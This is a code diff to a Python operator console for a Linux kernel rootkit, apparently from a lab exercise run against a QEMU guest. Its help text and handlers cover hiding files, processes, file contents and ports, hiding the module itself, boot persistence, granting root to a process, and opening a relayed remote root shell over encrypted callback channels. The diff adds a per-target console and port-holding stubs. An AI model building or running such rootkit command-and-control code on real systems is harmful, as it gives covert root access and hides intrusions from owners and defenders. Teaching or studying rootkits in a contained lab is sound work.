@@ -42,31 +42,31 @@ SHELL_STATUS = re.compile(
 )
 COMMAND_HELP = """\
 Hide
-  hide file PREFIX      hide files with this prefix from directory listings
-  hide pid PID          hide this PID from /proc
-  hide content STRING   hide lines containing this string from file reads
-  hide port PORT        hide this port from /proc/net/tcp
-  unhide CATEGORY N     unhide target at index N
-  unhide all            clear all hidden targets
+  hide file NAME        hide entries matching NAME from getdents64
+  hide pid PID          hide process from /proc
+  hide content STRING   hide lines containing STRING from read()
+  hide port PORT        hide local port from /proc/net/tcp
+  unhide CATEGORY N     remove entry N from a hide list
+  unhide all            clear all hide lists
 
 Operate
-  persist               stage a boot-load request
-  hide module           hide module from lsmod
-  unhide module         restore module visibility
-  escalate PID          escalate process to root
-  shell                 open interactive root Bash
-  shell status          show the latest shell result
+  hide module           remove module from /proc/modules
+  unhide module         restore module to /proc/modules
+  persist               request boot persistence
+  escalate PID          grant root credentials to PID
+  shell                 open root shell on the target
+  shell status          check shell state
 
 View
-  status                module state and target counts
-  list                  show all hidden targets with indices
-  list CATEGORY         show targets for file, pid, content, or port
+  status                module state and hide list counts
+  list                  show all hide lists with indices
+  list CATEGORY         show one list (file, pid, content, port)
 
 Session
-  ping                  test the control channel
-  info                  identify the agent
-  help                  show these commands
-  quit                  disconnect
+  ping                  test control channel
+  info                  show target hostname, kernel, arch
+  help                  show this reference
+  quit                  disconnect from target
 """
 
 _CATEGORIES = ("file", "pid", "content", "port")
@@ -218,11 +218,36 @@ class OperatorConsole(cmd.Cmd):
     def complete_shell(self, text: str, line: str, begidx: int, endidx: int):
         return [c for c in ("status",) if c.startswith(text)]
 
+    def _enumerate(self, cmd: str, prefix: str, header: str,
+                   fmt, *, max_parts: int = 3) -> None:
+        count_reply = self._exchange_quiet(cmd)
+        if not count_reply.startswith(f"{cmd} "):
+            return
+        count = int(count_reply.split()[1])
+        if count == 0:
+            self._output(f"  (none)\n")
+            return
+        self._output(f"  {header}\n")
+        for i in range(count):
+            entry = self._exchange_quiet(f"{cmd} {i}")
+            if entry.startswith(f"{prefix} "):
+                parts = entry.split(None, max_parts)
+                self._output(f"  {fmt(parts)}\n")
+
     def do_ping(self, arg: str) -> None:
         self._send("PING")
 
     def do_info(self, arg: str) -> None:
-        self._send("INFO")
+        reply = self._exchange_quiet("INFO")
+        if not reply.startswith("INFO "):
+            return
+        parts = reply[5:].split(None, 2)
+        if len(parts) >= 3:
+            self._output(f"  hostname: {parts[0]}\n")
+            self._output(f"  kernel:   {parts[1]}\n")
+            self._output(f"  arch:     {parts[2]}\n")
+        else:
+            self._output(f"  {reply[5:]}\n")
 
     def do_quit(self, arg: str) -> bool:
         self._quit = True
@@ -241,9 +266,27 @@ class OperatorConsole(cmd.Cmd):
 
     def postcmd(self, stop: bool, line: str) -> bool:
         return stop
+
+
+class TargetConsole(OperatorConsole):
+    """Operator console for a single target within the server."""
+
+    def do_back(self, arg: str) -> bool:
+        """Return to server view."""
+        return True
+
+    def do_quit(self, arg: str) -> bool:
+        return True
+
+    do_EOF = do_quit
+
+    def do_help(self, arg: str) -> None:
+        self._output(COMMAND_HELP)
+        self._output("  back                return to server view\n")
 CONTROL_TEXT_MAX = FRAME_MAX - HEADER_LENGTH - TAG_LENGTH
 SESSION_FILES = frozenset((
-    "control.key", "operator.ready", "session.toml",
+    "control.key", "control.sock", "operator.ready", "ports.held",
+    "session.toml", "shell.sock",
 ))
 SESSION_FIELDS = frozenset((
     "schema_version", "exercise", "target_pid", "target_start",
@@ -498,6 +541,18 @@ class TargetSession:
     def ready_file(self) -> Path:
         return self.directory / "operator.ready"
 
+    @property
+    def held_file(self) -> Path:
+        return self.directory / "ports.held"
+
+    @property
+    def control_sock(self) -> Path:
+        return self.directory / "control.sock"
+
+    @property
+    def shell_sock(self) -> Path:
+        return self.directory / "shell.sock"
+
     def close(self) -> None:
         for name in SESSION_FILES:
             path = self.directory / name
@@ -684,6 +739,31 @@ def read_target_session(
     )
 
 
+def hold_ports(target: TargetSession) -> tuple[socket.socket, socket.socket]:
+    """Bind stub listeners so QEMU guestfwd can connect at boot."""
+    control = _listener(target.control_port)
+    try:
+        shell = _listener(target.shell_port)
+    except BaseException:
+        control.close()
+        raise
+    _write_private(target.held_file, "held\n")
+    return control, shell
+
+
+def release_ports(
+    stubs: tuple[socket.socket, socket.socket],
+    target: TargetSession,
+) -> None:
+    """Close stub listeners so the operator can re-bind."""
+    stubs[0].close()
+    stubs[1].close()
+    try:
+        target.held_file.unlink()
+    except FileNotFoundError:
+        pass
+
+
 def wait_for_operator(target: TargetSession) -> None:
     """Wait until the second terminal has bound both callback listeners."""
     while True:
@@ -703,7 +783,7 @@ def wait_for_operator(target: TargetSession) -> None:
         return
 
 
-def _mark_operator_ready(target: TargetSession) -> None:
+def mark_operator_ready(target: TargetSession) -> None:
     if target.ready_file.exists() or target.ready_file.is_symlink():
         details = target.ready_file.lstat()
         if not stat.S_ISREG(details.st_mode) or details.st_uid != os.getuid():
@@ -767,7 +847,7 @@ class TargetProcess:
         return self.returncode
 
 
-def _build_crypto_helper(
+def build_crypto_helper(
     root: Path,
     directory: Path,
     transcript: Callable[[list[object]], None],
@@ -810,7 +890,7 @@ def _build_crypto_helper(
     return helper
 
 
-def _accept_while_running(
+def accept_while_running(
     listener: socket.socket,
     process,
     timeout: float,
@@ -842,7 +922,7 @@ def parse_shell_ticket(reply: str) -> tuple[int, int]:
     return request_id, cookie
 
 
-def _encode_control_command(command: str) -> bytes:
+def encode_control_command(command: str) -> bytes:
     try:
         payload = command.encode("ascii")
     except UnicodeEncodeError as error:
@@ -854,57 +934,8 @@ def _encode_control_command(command: str) -> bytes:
     return payload
 
 
-def _parse_operator_command(line: str) -> str | None:
-    """Legacy parser kept for non-interactive callers."""
-    parts = line.strip().split(None, 2)
-    if not parts:
-        return None
-    verb = parts[0].lower()
-    if verb == "hide":
-        if len(parts) == 2 and parts[1].lower() == "module":
-            return "HIDE MODULE"
-        if len(parts) == 3:
-            category = parts[1].lower()
-            value = parts[2]
-            if category in _CATEGORIES:
-                return f"HIDE {category.upper()} {value}"
-    elif verb == "unhide":
-        if len(parts) == 2 and parts[1].lower() == "all":
-            return "UNHIDE ALL"
-        if len(parts) == 2 and parts[1].lower() == "module":
-            return "UNHIDE MODULE"
-        if len(parts) == 3:
-            category = parts[1].lower()
-            index = parts[2]
-            if category in _CATEGORIES and index.isdigit():
-                return f"UNHIDE {category.upper()} {index}"
-    elif verb == "list":
-        if len(parts) == 1:
-            return "LIST ALL"
-        if len(parts) == 2:
-            category = parts[1].lower()
-            if category in _CATEGORIES:
-                return f"LIST {category.upper()}"
-    elif verb == "status":
-        return "STATUS"
-    elif verb == "persist":
-        return "PERSIST"
-    elif verb == "escalate" and len(parts) == 2 and parts[1].isdigit():
-        return f"ESCALATE {parts[1]}"
-    elif verb == "shell":
-        if len(parts) > 1 and parts[1].lower() == "status":
-            return "SHELL STATUS"
-        return f"SHELL {GUEST_SHELL_PORT}"
-    elif verb == "ping":
-        return "PING"
-    elif verb == "info":
-        return "INFO"
-    elif verb == "quit":
-        return "QUIT"
-    return None
 
-
-def _poll_shell_status(
+def poll_shell_status(
     request_id: int,
     exchange: Callable[[str], str],
     pause: Callable[[float], None] = time.sleep,
@@ -920,7 +951,7 @@ def _poll_shell_status(
     raise OperatorError("shell did not reach a terminal state")
 
 
-def _accept_shell_while_running(
+def accept_shell_while_running(
     listener: socket.socket,
     process,
     request_id: int,
@@ -934,7 +965,7 @@ def _accept_shell_while_running(
         shell = None
         remaining = deadline - time.monotonic()
         try:
-            shell = _accept_while_running(
+            shell = accept_while_running(
                 listener,
                 process,
                 remaining,
@@ -978,15 +1009,15 @@ def run_control_console(
             f"listen  shell    127.0.0.1:{operator.shell_port}\n"
             "wait    control  target callback\n"
         )
-        helper = _build_crypto_helper(
+        helper = build_crypto_helper(
             root,
             root / ".rklings/tools",
             transcript,
             output,
         )
-        _mark_operator_ready(target)
+        mark_operator_ready(target)
         output("ready   target   callback listeners bound\n")
-        peer = _accept_while_running(
+        peer = accept_while_running(
             operator.control_listener,
             process,
             90,
@@ -1008,7 +1039,7 @@ def run_control_console(
             return reply
 
         def exchange_quiet(command: str) -> str:
-            payload = _encode_control_command(command)
+            payload = encode_control_command(command)
             send_frame(peer, secure.seal_request(payload))
             return secure.open_reply(receive_frame(peer)).decode(
                 "ascii",
@@ -1018,7 +1049,7 @@ def run_control_console(
         def handle_shell(reply: str) -> None:
             request_id, cookie = parse_shell_ticket(reply)
             output("wait    shell    target callback\n")
-            shell = _accept_shell_while_running(
+            shell = accept_shell_while_running(
                 operator.shell_listener,
                 process,
                 request_id,
@@ -1033,9 +1064,9 @@ def run_control_console(
             success("verify  ticket   matched")
             output("Remote root Bash. Type exit to return.\n")
             with shell:
-                _relay_shell(shell, input_stream, output)
+                relay_shell(shell, input_stream, output)
             output("\nRemote Bash closed.\n")
-            _poll_shell_status(request_id, exchange)
+            poll_shell_status(request_id, exchange)
 
         console = OperatorConsole(exchange, exchange_quiet, output,
                                   warning, success, handle_shell)
@@ -1067,7 +1098,7 @@ def run_control_console(
             target.ready_file.unlink()
 
 
-def _relay_shell(
+def relay_shell(
     shell: socket.socket,
     input_stream: TextIO,
     output: Callable[[str], None],
